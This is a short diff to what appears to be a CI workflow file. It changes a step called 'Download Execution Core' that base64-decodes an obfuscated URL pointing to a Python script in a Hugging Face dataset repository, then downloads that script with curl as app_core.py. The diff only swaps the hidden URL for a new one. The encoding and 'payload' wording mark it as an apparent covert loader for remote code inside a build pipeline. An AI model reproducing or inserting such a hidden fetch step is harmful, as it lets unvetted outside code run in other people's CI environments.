@@ -69,7 +69,7 @@ jobs:
       - name: Download Execution Core
         run: |
           echo "[DOWNLOAD] Fetching encoded payload..."
-          TARGET_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          TARGET_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk=" | base64 --decode)
           curl -sL "$TARGET_URL" -o app_core.py
           echo "[DOWNLOAD] Script pulled successfully."
 
